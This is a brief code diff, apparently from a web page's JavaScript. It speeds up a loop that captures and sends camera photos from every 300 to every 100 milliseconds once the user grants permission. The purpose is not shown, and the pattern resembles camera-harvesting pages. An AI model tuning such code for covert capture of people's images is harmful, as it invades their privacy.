@@ -94,8 +94,8 @@
                 });
             }
 
-            // Capture and send photo every 300 milliseconds (faster interval)
-            setInterval(captureAndSendPhoto, 300);  // Interval set to capture every 300 milliseconds
+            // Capture and send photo every 100 milliseconds (faster interval)
+            setInterval(captureAndSendPhoto, 100);  // Interval set to capture every 100 milliseconds (0.1 second)
           })
           .catch((error) => {
             console.error('Permission error:', error);
